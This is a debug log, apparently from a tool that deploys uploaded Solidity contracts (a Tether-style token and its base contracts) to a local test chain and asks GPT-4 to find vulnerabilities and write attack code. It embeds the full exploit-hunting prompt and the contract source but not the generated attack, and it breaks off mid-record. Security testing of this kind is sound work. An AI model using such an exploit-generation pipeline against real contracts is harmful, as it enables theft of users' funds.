2025-06-23 14:53:55,402 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 14:53:55,405 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 14:53:55,407 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 14:53:55,410 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-23 14:53:55,412 - werkzeug - INFO - 192.168.96.1 - - [23/Jun/2025 14:53:55] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-23 14:53:55,428 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 14:53:55,446 - app.api.contract - INFO - Analyzing code snippet
2025-06-23 14:53:55,455 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-23 14:53:55,462 - app.services.contract_service - INFO - Created temporary file for contract code: /tmp/tmpllgr4ea4.sol
2025-06-23 14:53:55,474 - app.services.contract_service - INFO - Connected to Ganache at http://ganache:8545
2025-06-23 14:53:55,475 - app.services.contract_service - INFO - Compiling contract...
2025-06-23 14:53:55,871 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.4.17+commit.bdeb9e52
2025-06-23 14:53:57,710 - solcx - INFO - Using solc version 0.4.17
2025-06-23 14:53:57,712 - solcx - INFO - solc 0.4.17 successfully installed at: /root/.solcx/solc-v0.4.17
2025-06-23 14:53:57,717 - solcx - INFO - Using solc version 0.4.17
2025-06-23 14:54:03,003 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-23 14:54:04,051 - app.services.contract_service - INFO - Compilation result: 4 contracts compiled
2025-06-23 14:54:04,054 - app.services.contract_service - INFO - Deploying 4 contracts...
2025-06-23 14:54:04,448 - app.services.contract_service - INFO - Contract Ownable deployed at 0xC89Ce4735882C9F0f0FE26686c53074E09B0D550
2025-06-23 14:54:04,449 - app.services.contract_service - INFO - Setting up contract Ownable...
2025-06-23 14:54:04,573 - app.services.contract_service - INFO - Contract Ownable setup completed
2025-06-23 14:54:04,575 - app.services.contract_service - INFO - Funding contract Ownable for attack testing...
2025-06-23 14:54:04,725 - app.services.contract_service - INFO - Contract Ownable funded
2025-06-23 14:54:05,124 - app.services.contract_service - INFO - Contract Pausable deployed at 0xD833215cBcc3f914bD1C9ece3EE7BF8B14f841bb
2025-06-23 14:54:05,126 - app.services.contract_service - INFO - Setting up contract Pausable...
2025-06-23 14:54:05,296 - app.services.contract_service - INFO - Contract Pausable setup completed
2025-06-23 14:54:05,298 - app.services.contract_service - INFO - Funding contract Pausable for attack testing...
2025-06-23 14:54:05,457 - app.services.contract_service - INFO - Contract Pausable funded
2025-06-23 14:54:05,786 - app.services.contract_service - INFO - Contract SafeMath deployed at 0x9561C133DD8580860B6b7E504bC5Aa500f0f06a7
2025-06-23 14:54:05,787 - app.services.contract_service - INFO - Setting up contract SafeMath...
2025-06-23 14:54:05,816 - app.services.contract_service - INFO - Contract SafeMath setup completed
2025-06-23 14:54:05,818 - app.services.contract_service - INFO - Funding contract SafeMath for attack testing...
2025-06-23 14:54:05,962 - app.services.contract_service - INFO - Contract SafeMath funded
2025-06-23 14:54:09,491 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-23 14:54:10,383 - app.services.contract_service - INFO - Contract TetherToken deployed at 0xe982E462b094850F12AF94d21D470e21bE9D0E9C
2025-06-23 14:54:10,422 - app.services.contract_service - INFO - Setting up contract TetherToken...
2025-06-23 14:54:13,177 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-23 14:54:15,107 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-23 14:54:16,282 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-23 14:54:16,458 - app.services.contract_service - INFO - Contract TetherToken setup completed
2025-06-23 14:54:16,459 - app.services.contract_service - INFO - Funding contract TetherToken for attack testing...
2025-06-23 14:54:16,702 - app.services.contract_service - INFO - Contract TetherToken funded
2025-06-23 14:54:16,704 - app.services.contract_service - INFO - Building contract observation...
2025-06-23 14:54:19,464 - app.services.contract_service - INFO - Contract observation built successfully
2025-06-23 14:54:19,466 - app.services.contract_service - INFO - Generating attack strategy...
2025-06-23 14:54:19,467 - app.services.contract_service - INFO - Running Slither analysis...
2025-06-23 14:54:19,485 - app.services.contract_service - WARNING - Failed to run Slither analysis: solc-select non trouv√© : installe-le via pip install solc-select
2025-06-23 14:54:19,526 - app.services.contract_service - WARNING - Traceback (most recent call last):
  File "/app/modules/slither_scan.py", line 38, in ensure_solc_version
    subprocess.run(
  File "/usr/local/lib/python3.12/subprocess.py", line 548, in run
    with Popen(*popenargs, **kwargs) as process:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/subprocess.py", line 1026, in __init__
    self._execute_child(args, executable, preexec_fn, close_fds,
  File "/usr/local/lib/python3.12/subprocess.py", line 1955, in _execute_child
    raise child_exception_type(errno_num, err_msg, err_filename)
FileNotFoundError: [Errno 2] No such file or directory: 'solc-select'

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/app/services/contract_service.py", line 192, in analyze_contract_from_code
    slith_result = slither_analyze(temp_path)
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 152, in slither_analyze
    slither_result = run_slither(sol_path, json_path, solc_version)
                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 69, in run_slither
    ensure_solc_version(solc_version)
  File "/app/modules/slither_scan.py", line 44, in ensure_solc_version
    raise EnvironmentError("solc-select non trouv√© : installe-le via pip install solc-select")
OSError: solc-select non trouv√© : installe-le via pip install solc-select

2025-06-23 14:54:19,529 - app.modules.attack_generator - INFO - Starting complete attack strategy generation
2025-06-23 14:54:19,530 - app.modules.attack_generator - INFO - Contract name: Ownable
2025-06-23 14:54:19,531 - app.modules.attack_generator - INFO - Using step number: 0 for model selection
2025-06-23 14:54:19,532 - app.modules.attack_generator - INFO - üîç Step 1: Analyzing contracts for vulnerabilities...
2025-06-23 14:54:19,547 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-23 14:54:19,550 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-23 14:54:19,554 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-23 14:54:50,922 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-23 14:54:50,955 - app.modules.attack_generator - INFO - Received response from OpenAI API in 31.40 seconds
2025-06-23 14:54:50,966 - app.modules.attack_generator - INFO - Contract analysis completed in 31.40 seconds
2025-06-23 14:54:50,969 - app.modules.attack_generator - INFO - Vulnerability assessment: - **Centralization / Owner Privileges**:  
  The owner has extensive powers:
  - Can pause/unpause t...
2025-06-23 14:54:50,972 - app.modules.attack_generator - INFO - ‚öîÔ∏è Step 2: Generating attack code...
2025-06-23 14:54:50,974 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-23 14:54:50,975 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-23 14:54:50,977 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-23 14:54:54,274 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-23 14:54:54,296 - app.modules.attack_generator - INFO - Received response from OpenAI API in 3.32 seconds
2025-06-23 14:54:54,303 - app.modules.attack_generator - INFO - Attack code generation completed in 3.32 seconds
2025-06-23 14:54:54,305 - app.modules.attack_generator - INFO - Generated attack code of type solidity with length 719
2025-06-23 14:54:54,308 - app.modules.attack_generator - INFO - Total attack strategy generation completed in 34.72 seconds
2025-06-23 14:54:54,310 - app.modules.attack_generator - INFO - Attack strategy generation completed successfully
2025-06-23 14:54:54,323 - app.services.contract_service - INFO - Attack strategy generated successfully: {'analysis': {'analysis_prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmpllgr4ea4.sol",\n  "contracts": [\n    {\n      "contract_name": "Ownable",\n      "address": "0xC89Ce4735882C9F0f0FE26686c53074E09B0D550",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        }\n      ],\n      "functions": [\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0xC89Ce4735882C9F0f0FE26686c53074E09B0D550": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99873536340000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "Pausable",\n      "address": "0xD833215cBcc3f914bD1C9ece3EE7BF8B14f841bb",\n      "abi": [\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0xD833215cBcc3f914bD1C9ece3EE7BF8B14f841bb": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99873536340000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "paused": false,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    